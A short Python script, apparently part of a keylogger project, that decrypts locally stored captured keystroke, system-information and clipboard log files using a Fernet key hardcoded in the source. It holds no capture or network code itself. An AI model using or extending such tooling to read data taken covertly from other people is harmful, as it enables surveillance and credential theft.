from cryptography.fernet import Fernet

KEY = "j8m2foeb9665zwiyqZDLi3w9WB-LC3yRak0Cw7Ge9HQ="

KEYS_INFORMATION_E = "e_key_log.txt"
SYSTEM_INFORMATION_E = "e_systeminfo.txt"
CLIPBOARD_INFORMATION_E = "e_clipboard.txt"

encrypted_files = [KEYS_INFORMATION_E, SYSTEM_INFORMATION_E, CLIPBOARD_INFORMATION_E]

count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], "rb") as f:
        data = f.read()

    fernet = Fernet(KEY)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], "wb") as f:
        f.write(decrypted)

    count += 1